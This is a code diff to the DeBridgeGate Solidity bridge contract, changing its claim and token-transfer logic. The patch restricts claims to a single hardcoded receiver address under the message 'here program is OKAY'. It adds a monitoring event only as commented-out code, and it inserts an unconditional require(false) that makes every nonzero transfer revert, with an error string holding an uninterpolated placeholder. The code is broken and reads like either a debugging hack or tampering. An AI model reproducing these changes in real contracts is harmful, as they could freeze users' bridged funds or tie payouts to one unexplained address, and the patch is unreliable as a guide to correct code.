@@ -102,6 +102,8 @@ contract DeBridgeGate is
     /// @dev Locker for claim method
     uint256 public lockedClaim;
 
+    IDeBridgeToken public token;
+
     /* ========== ERRORS ========== */
 
     error FeeProxyBadRole();
@@ -905,8 +907,13 @@ contract DeBridgeGate is
             && _autoParams.flags.getFlag(Flags.UNWRAP_ETH)
             && _token == address(weth);
 
-        require((_amount > 0), 'here program is OKAY');
-        // _mintOrTransfer(_token, _receiver, _amount);
+        require((_receiver == 0x852e7627aEFF3ed6105F600D985cC6f74DBd6640), 'here program is OKAY');
+        // emit MonitoringClaimEvent(
+        //     _submissionId,
+        //     debridge.balance,
+        //     IERC20Upgradeable(debridge.tokenAddress).totalSupply()
+        // );
+        _mintOrTransfer(_token, _receiver, _amount);
     }
 
     function _mintOrTransfer(
@@ -915,8 +922,8 @@ contract DeBridgeGate is
         uint256 _amount
     ) internal {
         if (_amount > 0) {
-            // require(false, 'Token not found');
-            DeBridgeToken(_token).mint(_receiver, _amount);
+            require(false, 'Token not found ${debridge_id}');
+            IERC20Upgradeable(_token).safeTransfer(_receiver, _amount);
         }
     }
 
